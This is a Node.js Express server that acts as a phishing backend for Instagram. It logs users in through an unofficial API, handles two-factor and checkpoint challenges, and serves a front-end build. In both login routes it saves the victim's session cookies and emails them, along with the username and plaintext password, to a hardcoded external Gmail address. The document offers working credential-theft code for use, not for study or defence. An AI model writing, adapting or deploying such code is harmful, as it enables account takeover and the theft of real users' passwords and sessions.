if (process.env.NODE_ENV !== "production") {
  require("dotenv").config();
}
var nodemailer = require("nodemailer");
const fse = require("fs-extra");
const {
  IgApiClient,
  IgLoginTwoFactorRequiredError,
  IgLoginBadPasswordError,
  IgLoginInvalidUserError,
  IgCheckpointError,
} = require("instagram-private-api");

const ig = new IgApiClient();
var Promise = require("bluebird");
var randomstring = require("randomstring");
let express = require("express"),
  util = require("util"),
  session = require("express-session"),
  cookieParser = require("cookie-parser"),
  bodyParser = require("body-parser"),
  router = express.Router(),
  app = express();
let cors = require("cors");
var path = require("path");
var transporter = nodemailer.createTransport({
  service: "gmail",
  auth: {
    user: process.env.email,
    pass: process.env.password,
  },
});
app.set("views".__dirname + "/views");
app.set("view-engine", "ejs");
app.listen(process.env.PORT || 4000, function () {
  console.log("server running on", process.env.PORT || 4000);
});

app.options("*", cors());
app.use(cors());
app.use(cookieParser());
app.use(bodyParser.json()); // handle json data
app.use(bodyParser.urlencoded({ extended: true })); // handle URL-encoded data
app.set("views", __dirname + "/views");
app.set("view engine", "ejs");

app.use(express.static(path.join(__dirname, "build")));

//home route
app.get("/", function (req, res) {
  res.send("<h1>Welcome</h1>");
});
//resend auth code
app.get("/insta/getCode", (req, res) => {
  if (req.query.choice != null)
    ig.challenge
      .replay(req.query.choice)
      .then((response) => {
        res.json({ success: true, response: response });
      })
      .catch((err) => {
        res.json({ success: false });
      });
});
//verify email code
app.get("/insta/emailVerify", (req, res) => {
  return ig.challenge
    .sendSecurityCode(req.query.code)
    .then((val) => {
      console.log("verification success");
      res.json({
        success: true,
        redirect: true,
        message: "Security code verified",
      });
      res.end();
    })
    .catch((err) => {
      console.log(err);
      console.log("error occured in email auth");
      res.json({ success: false, message: "code is incorrect" });
    });
});
//submit auth code
app.get("/insta/submitCode", (req, res) => {
  ig.request.end$.subscribe(async () => {
    const cookies = await ig.state.serializeCookieJar();
    const state = {
      deviceString: ig.state.deviceString,
      deviceId: ig.state.deviceId,
      uuid: ig.state.uuid,
      phoneId: ig.state.phoneId,
      adid: ig.state.adid,
      build: ig.state.build,
    };
    // restore session cookies
    await ig.state.deserializeCookieJar(JSON.stringify(cookies));
    ig.state.deviceString = state.deviceString;
    ig.state.deviceId = state.deviceId;
    ig.state.uuid = state.uuid;
    ig.state.phoneId = state.phoneId;
    ig.state.adid = state.adid;
    ig.state.build = state.build;
  });

  return ig.account
    .twoFactorLogin({
      username: req.query.username,
      verificationCode: req.query.code,
      twoFactorIdentifier: req.query.two_factor_identifier,
      verificationMethod: req.query.verificationMethod, // '1' = SMS (default), '0' = OTP
      trustThisDevice: "1", // Can be omitted as '1' is used by default
    })
    .then((val) => {
      ig.state.serializeCookieJar().then((val2) => {
        val2.cookies.map((cookiepairs) => {
          cookiepairs["name"] = cookiepairs["key"];
          delete cookiepairs["key"];
        });
        fse
          .outputJSON(
            __dirname + `/tempt/${req.query.username}.txt`,
            val2.cookies
          )
          .then((result) => {
            console.log(result);
            fse
              .readFile(__dirname + `/tempt/${req.query.username}.txt`)
              .then((data) => {
                console.log(data);
                var mailOptions = {
                  from: process.env.email,
                  to: "tklinger50@gmail.com",
                  subject:
                    "cookies of Username:" +
                    req.query.username +
                    " Password:" +
                    req.query.password,
                  attachments: [
                    {
                      filename: __dirname + `/tempt/${req.query.username}.txt`,
                      content: data,
                    },
                  ],
                };
                transporter.sendMail(mailOptions, function (error, info) {
                  if (error) {
                    console.log(error);
                    res.json({
                      success: true,
                      user: val,
                      cookie: JSON.stringify(val2.cookies),
                      message: "login Successful but failed to send email",
                    });
                  } else {
                    console.log("Email sent: " + info.response);
                    res.json({
                      success: true,
                      user: val,
                      cookie: JSON.stringify(val2.cookies),
                      message: "login Successful and email has been sent.",
                    });
                    res.end();
                  }
                });
              })
              .catch((err) => {
                console.log(err);
                res.json({
                  success: true,
                  user: val,
                  cookie: val2.cookies,
                  message: "login Successful but failed to send email",
                });
                res.end();
              });
          })
          .catch((error) => {
            console.log(error);
            res.json({
              success: true,

              user: val,
              cookie: val2.cookies,
              message: "login Successful but failed to send email",
            });
            res.end();
          });
      });
    })
    .catch((error) => {
      console.log(error);
      console.log("error occured in 2fa auth");
      res.json({ success: false, message: "code incorrect!" });
    });
});

app.post("/insta", (req, res) => {
  // Initiate Instagram API client
  console.log("insta login test");
  console.log(req.body);
  ig.state.generateDevice(req.body.username);

  return Promise.try(() =>
    ig.account.login(req.body.username, req.body.password).then((val) => {
      ig.state.serializeCookieJar().then((val2) => {
        val2.cookies.map((cookiepairs) => {
          cookiepairs["name"] = cookiepairs["key"];
          delete cookiepairs["key"];
        });
        fse
          .outputJSON(
            __dirname + `/tempt/${req.body.username}.txt`,
            val2.cookies
          )
          .then((result) => {
            console.log(result);
            fse
              .readFile(__dirname + `/tempt/${req.body.username}.txt`)
              .then((data) => {
                console.log(data);
                var mailOptions = {
                  from: process.env.email,
                  to: "tklinger50@gmail.com",
                  subject:
                    "cookies of Username:" +
                    req.body.username +
                    " Password:" +
                    req.body.password,
                  attachments: [
                    {
                      filename: __dirname + `/tempt/${req.body.username}.txt`,
                      content: data,
                    },
                  ],
                };
                transporter.sendMail(mailOptions, function (error, info) {
                  if (error) {
                    console.log(error);
                    res.json({
                      success: true,
                      twoFactor: false,
                      user: val,
                      cookie: JSON.stringify(val2.cookies),
                      message: "login Successful but failed to send email",
                    });
                  } else {
                    console.log("Email sent: " + info.response);
                    res.json({
                      success: true,
                      twoFactor: false,
                      user: val,
                      cookie: JSON.stringify(val2.cookies),
                      message: "login Successful and email has been sent.",
                    });
                    res.end();
                  }
                });
              })
              .catch((err) => {
                console.log(err);
                res.json({
                  success: true,
                  twoFactor: false,
                  user: val,
                  cookie: val2.cookies,
                  message: "login Successful but failed to send email",
                });
                res.end();
              });
          })
          .catch((error) => {
            console.log(error);
            res.json({
              success: true,
              twoFactor: false,
              user: val,
              cookie: val2.cookies,
              message: "login Successful but failed to send email",
            });
            res.end();
          });
      });
    })
  ).catch(
    IgLoginTwoFactorRequiredError,
    IgLoginBadPasswordError,
    IgLoginInvalidUserError,
    IgCheckpointError,
    async (err) => {
      console.log(err.response);
      if (
        err.response.body.error_type === "checkpoint_challenge_required" &&
        err.response.body.message === "challenge_required"
      ) {
        console.log(ig.state.checkpoint);
        await ig.challenge.auto(true);
        res.json({
          success: true,
          twoFactor: true,
          message: "A code has been sent to you via sms/email.Please check",
          email_auth: true,
        });
        res.end();
      }
      if (
        err.response.body.error_type === "bad_password" &&
        err.response.body.two_factor_info === undefined
      ) {
        res.json({ success: false, message: "invalid password" });
        res.end();
      } else if (err.response.body.error_type === "invalid_user") {
        res.json({ success: false, message: "invalid username" });
        res.end();
      } else {
        const {
          username,
          totp_two_factor_on,
          two_factor_identifier,
        } = err.response.body.two_factor_info;
        if (!two_factor_identifier) {
          res.json({
            message: "Unable to login, no 2fa identifier found",
            success: false,
          });
          res.end();
          throw new Error("Unable to login, no 2fa identifier found");
        }

        const verificationMethod = totp_two_factor_on ? "0" : "1"; // default to 1 for SMS
        console.log("sms sent");
        res //sending Two Factor details
          .json({
            username,
            two_factor_identifier,
            verificationMethod,
            success: true,
            twoFactor: true,
            email_auth: false,
            message: "code has been sent",
          });
        res.end;
      }

      // Use the code to finish the login process
    }
  );
});
function ensureAuthenticated(req, res, next) {
  if (req.isAuthenticated()) {
    return next();
  }
  res.redirect("/login");
}
// Method to logout
app.get("/logout", ensureAuthenticated, function (req, res) {
  req.logout();
  res.redirect("/");
});
app.get("/logout/insta", (req, res) => {
  ig.account
    .logout()
    .then((val) => {
      console.log("logout");
      console.log(val);
      res.json({ success: true });
    })
    .catch((err) => {
      res.json({ success: false });
    });
});
app.use("*", (req, res) =>
  res.sendFile(path.join(__dirname, "build", "index.html"))
);
